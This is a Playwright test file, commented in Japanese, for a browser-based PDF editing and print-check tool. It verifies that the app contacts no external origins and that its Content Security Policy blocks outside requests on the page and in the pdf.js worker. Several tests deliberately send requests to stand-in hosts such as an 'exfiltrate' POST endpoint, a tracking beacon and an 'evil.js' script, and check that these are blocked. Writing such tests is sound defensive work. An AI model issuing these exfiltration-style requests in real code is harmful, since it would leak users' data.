// HC-1 / HC-2 / HC-3: 外部への通信がないこと、CSP がページとワーカーの両方で効いていることを検証する。
import { expect, test } from '@playwright/test';
import { addPdfs, makePdf } from './fixtures.ts';

const ORIGIN = 'http://localhost:4173';

test('一連の操作の間、外部オリジンへのリクエストが 0 件で、CSP 違反も起きない', async ({ page, context }) => {
  const external: string[] = [];
  await context.route('**/*', (route) => {
    const url = route.request().url();
    if (url.startsWith(ORIGIN) || url.startsWith('blob:') || url.startsWith('data:')) return route.continue();
    external.push(url);
    return route.abort();
  });
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });

  const violations = () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

  // 1. 編集: 読み込み・サムネイル・結合・分割
  await page.goto('/');
  await addPdfs(page, [
    { name: 'a.pdf', buffer: await makePdf('A', [101, 102, 103]) },
    { name: 'b.pdf', buffer: await makePdf('B', [201, 202]) },
  ]);
  await expect(page.locator('.thumb canvas[data-state="done"]')).toHaveCount(5);
  await Promise.all([page.waitForEvent('download'), page.click('[data-action="save-all"]')]);
  await page.click('[data-action="open-split"]');
  await Promise.all([page.waitForEvent('download'), page.click('#split-form button[type="submit"]')]);
  expect(await violations()).toEqual([]);

  // 2. 入稿: A5 の PDF でチェック(文字の解析・描画・くすみ判定)→ 入稿用 PDF(トンボ付き)を作って保存
  await page.goto('/');
  await addPdfs(page, [{ name: 'a5.pdf', buffer: await makeA5() }]);
  await page.click('[data-mode-tab="check"]');
  await page.click('#check-form button[type="submit"]');
  await expect(page.locator('.check-summary')).toBeVisible();
  await page.locator('.preview-modes').getByText('印刷の目安').click();
  await page.check('#fix-panel input[name="output"][value="marks"]');
  await page.click('#fix-panel button[type="submit"]');
  await expect(page.locator('.fixed-banner')).toBeVisible();
  await Promise.all([page.waitForEvent('download'), page.click('.fixed-actions .btn-primary')]);
  expect(await violations()).toEqual([]);

  expect(external).toEqual([]);
});

async function makeA5(): Promise<Buffer> {
  const { PDFDocument, rgb, StandardFonts } = await import('@cantoo/pdf-lib');
  const doc = await PDFDocument.create();
  const page = doc.addPage([148 * (72 / 25.4), 210 * (72 / 25.4)]);
  page.drawRectangle({ x: 0, y: 0, width: page.getWidth(), height: page.getHeight(), color: rgb(0.1, 0.4, 0.9) });
  const font = await doc.embedFont(StandardFonts.Helvetica);
  page.drawText('Hello', { x: 60, y: 300, size: 24, font });
  return Buffer.from(await doc.save());
}

test('ページから外部への fetch は CSP(connect-src)で止まる', async ({ page }) => {
  await page.goto('/');
  const directive = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.violatedDirective), { once: true });
        fetch('https://example.com/exfiltrate', { method: 'POST', body: 'x' }).catch(() => {});
        setTimeout(() => resolve('not blocked'), 5_000);
      }),
  );
  expect(directive).toBe('connect-src');
});

test('外部の画像・スクリプトの読み込みも CSP で止まる', async ({ page }) => {
  await page.goto('/');
  const directives = await page.evaluate(
    () =>
      new Promise<string[]>((resolve) => {
        const seen: string[] = [];
        document.addEventListener('securitypolicyviolation', (e) => {
          seen.push(e.violatedDirective);
          if (seen.length === 2) resolve(seen.sort());
        });
        const img = document.createElement('img');
        img.src = 'https://example.com/beacon.gif';
        document.body.append(img);
        const script = document.createElement('script');
        script.src = 'https://example.com/evil.js';
        document.head.append(script);
        setTimeout(() => resolve(seen.sort()), 5_000);
      }),
  );
  expect(directives).toEqual(['img-src', 'script-src-elem']);
});

test('pdf.js のワーカーは blob: から生成され、ワーカー内の外部通信も CSP で止まる', async ({ page }) => {
  await page.goto('/');
  const workerPromise = page.waitForEvent('worker');
  await addPdfs(page, [{ name: 'a.pdf', buffer: await makePdf('A', [101]) }]);
  const worker = await workerPromise;
  await expect(page.locator('.thumb canvas[data-state="done"]')).toHaveCount(1);

  expect(worker.url()).toMatch(/^blob:/);
  const directive = await worker.evaluate(
    () =>
      new Promise<string>((resolve) => {
        self.addEventListener('securitypolicyviolation', (e) => resolve((e as SecurityPolicyViolationEvent).violatedDirective));
        fetch('https://example.com/exfiltrate').catch(() => {});
        setTimeout(() => resolve('not blocked'), 5_000);
      }),
  );
  expect(directive).toBe('connect-src');
});
